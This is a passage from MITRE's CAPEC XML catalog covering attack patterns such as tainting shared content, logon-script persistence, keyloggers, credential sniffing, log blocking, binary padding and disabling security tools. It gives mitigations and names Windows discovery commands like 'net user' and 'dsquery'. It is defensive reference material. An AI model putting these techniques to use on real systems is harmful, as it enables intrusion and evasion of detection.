            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="560"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow accounts to be a local administrator on more than one system.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1077</Entry_ID>
               <Entry_Name>Windows Admin Shares</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="562" Name="Modify Shared File" Abstraction="Detailed" Status="Draft">
         <Description>An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Disallow shared content. Protect shared folders by minimizing users that have write access. Use utilities that mitigate exploitation like the Microsoft Enhanced Mitigation Experience Toolkit (EMET) to prevent exploits from being run.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1080</Entry_ID>
               <Entry_Name>Taint shared content</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="563" Name="Add Malicious File to Shared Webroot" Abstraction="Detailed" Status="Draft">
         <Description>An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="17"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Ensure proper permissions on directories that are accessible through a web server. Disallow remote access to the web root. Disable execution on directories within the web root. Ensure that permissions of the web server process are only what is required by not using built-in accounts and instead create specific accounts to limit unnecessary access or permissions overlap across multiple systems.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1051</Entry_ID>
               <Entry_Name>Shared Webroot</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="564" Name="Run Software at Logon" Abstraction="Detailed" Status="Draft">
         <Description>Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Restrict write access to logon scripts to necessary administrators.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1037</Entry_ID>
               <Entry_Name>Logon scripts</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1159</Entry_ID>
               <Entry_Name>Launch Agent</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1162</Entry_ID>
               <Entry_Name>Login Item</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="568" Name="Capture Credentials via Keylogger" Abstraction="Detailed" Status="Draft">
         <Description>An adversary deploys a keylogger in an effort to obtain credentials directly from a system's user. After capturing all the keystrokes made by a user, the adversary can analyze the data and determine which string are likely to be passwords or other credential related information.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="569"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to install the keylogger, either in person or remote.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Strong physical security can help reduce the ability of an adversary to install a keylogger.</Mitigation>
         </Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1056</Entry_ID>
               <Entry_Name>Input Capture</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="569" Name="Collect Data as Provided by Users" Abstraction="Standard" Status="Draft">
         <Description>An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system. This information is often needed by the attacker to launch a follow-on attack. This attack is different than Social Engineering as the adversary is not tricking or deceiving the user. Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system. Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="116"/>
         </Related_Attack_Patterns>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1141</Entry_ID>
               <Entry_Name>Input Prompt</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="57" Name="Utilizing REST's Trust in the System Resource to Register Man in the Middle" Abstraction="Detailed" Status="Draft">
         <Description>This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to place man in the middle once SSL is terminated. Rest applications premise is that they leverage existing infrastructure to deliver web services functionality. An example of this is a Rest application that uses HTTP Get methods and receives a HTTP response with an XML document. These Rest style web services are deployed on existing infrastructure such as Apache and IIS web servers with no SOAP stack required. Unfortunately from a security standpoint, there frequently is no interoperable identity security mechanism deployed, so Rest developers often fall back to SSL to deliver security. In large data centers, SSL is typically terminated at the edge of the network - at the firewall, load balancer, or router. Once the SSL is terminated the HTTP request is in the clear (unless developers have hashed or encrypted the values, but this is rare). The attacker can utilize a sniffer such as Wireshark to snapshot the credentials, such as username and password that are passed in the clear once SSL is terminated. Once the attacker gathers these credentials, they can submit requests to the web service provider just as authorized user do. There is not typically an authentication on the client side, beyond what is passed in the request itself so once this is compromised, then this is generally sufficient to compromise the service's authentication scheme.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Opportunity to intercept must exist beyond the point where SSL is terminated.</Prerequisite>
            <Prerequisite>The attacker must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To insert a network sniffer or other listener into the communication stream</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implementation: Implement message level security such as HMAC in the HTTP communication</Mitigation>
            <Mitigation>Design: Utilize defense in depth, do not rely on a single security mechanism like SSL</Mitigation>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the attacker can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
            <Related_Weakness CWE_ID="287"/>
            <Related_Weakness CWE_ID="724"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="571" Name="Block Logging to Central Repository" Abstraction="Standard" Status="Draft">
         <Description>An adversary may attempt to block indicators from leaving the host machine. In the case of network based reporting of indicators, an adversary may block traffic associated with reporting to prevent central station analysis. This may be accomplished by many means such as stopping a local process to creating a host-based firewall rule to block traffic to a specific server.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="161"/>
         </Related_Attack_Patterns>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1054</Entry_ID>
               <Entry_Name>Indicator Blocking</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="572" Name="Artificially Inflate File Sizes" Abstraction="Detailed" Status="Draft">
         <Description>Security tools often inspect executables to determine if they are malicious. Adversaries may add data to executables to increase the executable size beyond what security tools are capable of handling. Adding data to an executable also changes the file's hash, frustrating security tools that look for known bad files by their hash.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="148">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1009</Entry_ID>
               <Entry_Name>Binary padding</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="573" Name="Process Footprinting" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>On a Windows system, the command, "tasklist," displays information about processes. The same function on a Mac OS system is done with the command, "ps."</Example>
            <Example>In addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1057</Entry_ID>
               <Entry_Name>Process Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="574" Name="Services Footprinting" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits functionality meant to identify information about the services on the target system to an authorized user. By knowing what services are registered on the target system, the adversary can learn about the target environment as a means towards further malicious behavior. Depending on the operating system, commands that can obtain services information include "sc" and "tasklist/svc" using Tasklist, and "net start" using Net.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify programs that may be used to acquire service information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1007</Entry_ID>
               <Entry_Name>System Service Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="575" Name="Account Footprinting" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits functionality meant to identify information about the domain accounts and their permissions on the target system to an authorized user. By knowing what accounts are registered on the target system, the adversary can inform further and more targeted malicious behavior. Example Windows commands which can acquire this information are: "net user" and "dsquery".</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify programs that may be used to acquire account information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1087</Entry_ID>
               <Entry_Name>Account Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="576" Name="Group Permission Footprinting" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits functionality meant to identify information about user groups and their permissions on the target system to an authorized user. By knowing what users/permissions are registered on the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command which can list local groups is "net localgroup".</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Identify programs (such as "net") that may be used to enumerate local group permissions and block them by using a software restriction Policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1069</Entry_ID>
               <Entry_Name>Permission Groups Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="577" Name="Owner Footprinting" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits functionality meant to identify information about the primary users on the target system to an authorized user. They may do this, for example, by reviewing logins or file modification times. By knowing what owners use the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command that may accomplish this is "dir /A ntuser.dat". Which will display the last modified time of a user's ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.</Prerequisite>
            <Prerequisite>Administrator permissions are required to view the home folder of other users.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Hide Activities</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure that proper permissions on files and folders are enacted to limit accessibility.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1033</Entry_ID>
               <Entry_Name>System Owner/User Discovery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="578" Name="Disable Security Software" Abstraction="Standard" Status="Usable">
         <Description>An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="176"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have the capability to interact with the configuration of the targeted system.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Hide Activities</Impact>
               <Note>By disabling certain security tools, the adversary can hide malicious activity and avoid detection.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure proper permissions are in place to prevent adversaries from altering the execution status of security tools.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1089</Entry_ID>
               <Entry_Name>Disabling Security Tools</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="579" Name="Replace Winlogon Helper DLL" Abstraction="Detailed" Status="Draft">
         <Description>Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Mitigations>
